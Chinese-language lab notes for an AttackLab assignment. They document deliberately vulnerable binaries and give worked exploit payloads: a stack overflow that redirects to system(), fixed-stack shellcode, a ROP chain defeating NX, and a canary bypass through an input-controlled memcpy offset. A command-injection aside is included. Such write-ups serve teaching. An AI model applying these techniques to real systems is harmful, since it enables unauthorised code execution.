# AttackLab 技术笔记（2026-11-02）

本文档是实验报告的事实来源汇总：所有地址均来自本仓库 `attack/` 中的原始
二进制（哈希与 `.github/workflows/lab3-checks.yml` 一致），并通过 `objdump`、
`nm`、`readelf` 与 GDB 实际验证。可复现脚本位于 `tools/`，原始记录位于
`analysis/gdb/`、`analysis/logs/`、`analysis/disassembly/`。

## 1. 三个 ELF 与 malware 的静态事实

| 项目 | dark-calc | dark-calc-nx | dark-log |
|---|---|---|---|
| 类型 | ELF64 x86-64 ET_EXEC（非 PIE） | 同左 | 同左 |
| GNU_STACK | RW（未请求执行） | RW | RW |
| RELRO | Partial | Partial | Partial |
| canary 导入 | 无 | 无 | `__stack_chk_fail` |
| 特殊路径 | `init_fixed_stack` 构造器 + `__wrap_main` | 无 | 无 |

- 三个主映像都链接在 0x400000，`.text` 地址固定，与 ASLR 无关。
- `dark-calc` 的 `.init_array` 里有 `init_fixed_stack`：以
  `mmap(0x721000000000, 0x802000, PROT_READ|PROT_WRITE|PROT_EXEC,
  MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0)` 映射固定地址的 8 MiB
  匿名区，然后把两端各 0x1000 用 `mprotect(..., PROT_NONE)` 变成守卫页，
  把 `0x721000801000` 存入 `fixed_stack_top`。
- `__wrap_main`：`push r12; mov r12,rsp; mov rsp,[fixed_stack_top]; call main;
  mov rsp,r12; pop r12; ret`。因此 dark-calc 的 main 及其全部调用链运行在
  0x721000001000–0x721000801000 这段 rwxp 固定地址栈上，运行期映射（GDB
  `info proc mappings`）证实权限为 rwxp，两侧 ---p。
- `dark-calc-nx` 没有固定栈构造器，栈是内核分配的普通线程栈，映射为 rw-p
  （NX 生效），栈地址随机（ASLR=2）。

### dark-calc / dark-calc-nx 的输入路径

`input()`：`char expression[MAXLEN+1]`（16 字节，`rbp-0x10`），无界 `gets`，
然后 `strcpy(command_buf, expression)`（`command_buf` 是 0x6030d0/0x602090
处的全局 31 字节缓冲）。
`eval()`：`len = min(strlen(command_buf), 15)`，把
`command_buf` 右移到 `+8`，前缀 `"echo $(("`（8 字节），后缀 `"))"`，然后
`printf("Executing: %s\n")` + `system(command_buf)`。
`main()`：无限循环 `input(); eval();`。
`grade_eval(int grade)`：`grade==4` 时打印 `\n\033[31m Hope %c will be your
grade! \n`（`4-4+'A'='A'`），随后 `fflush(stdout)`。

- dark-calc：`grade_eval=0x401a87`，`system@plt=0x4017e0`，eval 的调用点
  `mov edi,0x6030d0; call system@plt` = **0x401a6b**，input 的空输入分支
  `mov edi,0; call exit@plt` = **0x4019b9**。
- dark-calc-nx：`input=0x401868`，`grade_eval=0x401978`，input 的空输入分支
  `mov edi,0; call exit@plt` = **0x4018aa**。
- 二者 `__libc_csu_init` 尾部都是 `pop rbx; pop rbp; pop r12; pop r13; pop
  r14; pop r15; ret`，机器码 `41 5f c3`，因此从第 2 个字节进入得到
  `pop rdi; ret`：dark-calc **0x401c93**，dark-calc-nx **0x401a33**。

### dark-log

`struct log_frame { char expression[128]; char logMsg[128]; int len;
char pad[8]; }`，编译器把它放在一个 0x120 的帧里：

| 偏移（相对 rbp） | 字段 |
|---|---|
| -0x120 | expression[0..127] |
| -0xa0 | logMsg[0..127] |
| -0x20 | len（int） |
| -0x18 | pad[8] |
| -0x08 | stack canary（fs:0x28 的副本） |
| +0x00 | saved rbp |
| +0x08 | saved return address |

`input()`：`f.len=0; puts(...); gets(f.expression)`（无界），然后
`memcpy(f.logMsg + f.len, f.expression, 128)`——**len 由输入控制，决定这
128 字节拷贝的目的地**；返回前 `[rbp-8] ^ fs:0x28` 校验，失败调用
`__stack_chk_fail`。`main()` 与 `grade_eval()` 也各自有独立 canary。
`grade_eval=0x401677`；csu 尾部的未对齐 `pop rdi; ret` = **0x4018a3**。

### attack/malware

POSIX shell 脚本：打印进程树，然后沿父进程链向上找 `comm == "dark-calc"`；
找到打印 `### You have successfully detonated the bomb! Congratulations! ###`。
所以它必须由 dark-calc 通过 `system()` 之类的方式直接/间接启动。

## 2. dark-calc 固定栈上的 input 帧（任务一）

GDB 实测（`analysis/gdb/01_frame_and_main.txt`，ASLR 打开）：

| 地址 | 内容 |
|---|---|
| 0x721000800fd0 | expression[16]（gets 写入起点） |
| 0x721000800fe0 | input 的 saved rbp = 0x721000800ff0（main 的 rbp） |
| 0x721000800fe8 | input 的返回地址 = 0x401ad1（main+0xe） |
| 0x721000800ff0 | main 的 saved rbp = 0（_start 里 xor ebp,ebp 之后） |
| 0x721000800ff8 | __wrap_main 调 main 压入的返回地址 0x401c1f |
| 0x721000801000 | 守卫页起点（PROT_NONE） |

- 缓冲区首地址是 **常量** `0x721000800fd0`（固定映射，无随机化）。
- 从缓冲区到返回地址槽 = 24 字节；到守卫页 = 48 字节。gets 在输入末尾写
  一个 NUL，因此 dark-calc 上单次输入最多 47 字节，否则 gets 自身触发
  SIGSEGV（写入 PROT_NONE 页）。

## 3. 各任务利用方案

### 任务三 payload.py（32 字节）→ system("./malware")

```
"./malware\0" + "A"*6          # expression[16]
"B"*8                          # saved rbp（leave 之后不再被本路径使用）
p64(0x401a6b)                  # 返回地址 → eval 的 mov edi,0x6030d0; call system
```
`input()` 的 `strcpy` 把 expression 按 C 字符串拷进 `command_buf`，即
`"./malware"`；返回地址改为 0x401a6b 后直接以 `rdi=0x6030d0` 调 `system`。
dash 执行 `sh -c ./malware`，malware 的父链是 sh→dark-calc，命中判定。
system 返回后 eval 尾声 `leave` 使用我们伪造的 rbp（0x4242…）→ SIGBUS，
但 malware 的 stdout 已输出、grade_eval 同款消息已 flush，CI 只检查 stdout。
三 qword 的 `pop rdi; ret` 链需要 24+24=48 字节，加 NUL 超窗，故用此 32 字节
方案。另注：`$(./malware)` 共 12 字符，放进 `$(( ... ))` 里 dash/bash 都会先
做命令替换（实测），说明包装字符串同样有命令注入面；本任务仍按要求用溢出。

### 任务五 payload_dark.py（40 字节）→ 固定栈 shellcode

```
6a 04 5f                       push 4; pop rdi
48 b8 87 1a 40 00 00 00 00 00  movabs rax,0x401a87
ff e0                          jmp rax
... NOP 填充到 24 字节
p64(0x721000800fd0)            input 返回地址 → 缓冲区（shellcode）
p64(0x4019b9)                  grade_eval 返回 → mov edi,0; call exit@plt
```
用 `jmp` 而不是 `call`：shellcode 入口时 rsp=0x721000800ff0，栈上只剩 8 字节
可写；grade_eval 的 prologue 恰好落在守卫页下方，其返回地址槽就是我们放的
exit(0) 调用点，进程以状态 0 干净退出。

### 任务六 payload_rop.py（56 字节）→ dark-calc-nx 的 ROP

```
"R"*24                         padding 到返回地址槽
p64(0x401a33)                  pop rdi; ret
p64(4)                         参数 grade=4
p64(0x401978)                  grade_eval
p64(0x4018aa)                  mov edi,0; call exit@plt（干净退出）
```
栈对齐：input 的 ret 之后 rsp%16=0；pop rdi 之后 %16=8；进入 grade_eval 时
%16=8，与正常 call 一致，故其内部 printf 不会因 movaps 崩溃。全链只用非 PIE
主映像固定地址，不依赖栈地址与 libc 地址（ASLR 无效）。

### 任务七 payload_canary.py（260 字节）→ dark-log 保 canary 改流

```
[0..7]    "K"*8                      fake saved rbp
[8..15]   p64(0x4018a3)              pop rdi; ret
[16..23]  p64(4)
[24..31]  p64(0x401677)              grade_eval
[32..255] "L" 填充
[256..259] p32(0xa0)                 len = 160 → memcpy 目的 = rbp
```
- 输入只有 260 字节：gets 的 NUL 落在偏移 260（pad 区），canary（偏移 280）
  完全未触及。
- `memcpy(logMsg + 0xa0, expression, 128)` 的目的地 = rbp，恰好覆盖 saved
  rbp 与返回地址（rbp..rbp+0x7f），canary 保持 fs:0x28 原值，校验通过，
  `leave; ret` 进入 ROP 链。
- 对照实验（覆盖 canary 的 288 字节输入）触发
  `*** stack smashing detected ***: terminated` + SIGABRT（04b 记录）。
- grade_eval 打印并 flush 后返回到 "L" 填充处 → SIGSEGV；CI 只检查 stdout。

## 4. 长度行为矩阵（任务二）

实测（`analysis/logs/length_tests.md`，输入为 '1' 串）：
0 → 打印 `42_is_The_Ànswer` 退出 0；1–15 → eval 正常执行
`echo $((...))`；16–23 → 覆盖 saved rbp 但返回地址完好，eval 把输入截断到
15 字符照常执行；24–47 → 返回地址被覆盖，返回时崩溃（SIGBUS/SIGSEGV）；
≥48 → gets 的 NUL 写入守卫页，gets 内部 SIGSEGV。另注意 stdout 是全缓冲的，
`system()` 子进程的输出会先于 `Executing:` 行出现。

## 5. 复现命令（WSL2）

```sh
rm -rf ~/lab3 && mkdir ~/lab3 && cp /mnt/e/AttackLab/attack/* ~/lab3/ && chmod +x ~/lab3/*
python3 tools/make_inputs.py                       # /tmp/lab3-inputs/*
bash   tools/capture_gdb.sh                        # analysis/gdb/*.txt
bash   tools/capture_disassembly.sh                # analysis/disassembly/*.txt
python3 tools/run_evidence.py                      # analysis/logs/*（含 CI 等价测试）
python3 payload.py | (cd ~/lab3 && ./dark-calc)    # 单个 payload 手动验证
```
CI 等价：`python3 payload_*.py > p.bin; (cd attack && ./<target> < p.bin)`。

## 6. 环境

WSL2 Ubuntu 26.04，内核 6.18.33.2-microsoft-standard-WSL2；glibc 2.43；
gcc 15.2.0；GNU gdb 17.1；binutils 2.46；Python 3.14.4；
`/proc/sys/kernel/randomize_va_space=2`。GDB 默认 `disable-randomization=on`，
本实验所有会话都显式 `set disable-randomization off`。CI 为 ubuntu-24.04
（glibc 2.39）：四个 payload 只使用非 PIE 固定代码地址与 dark-calc 的固定
映射地址，不依赖栈/libc 地址，glibc 版本差异不影响结果（gets、system 等符号
在 2.39/2.43 均存在）。
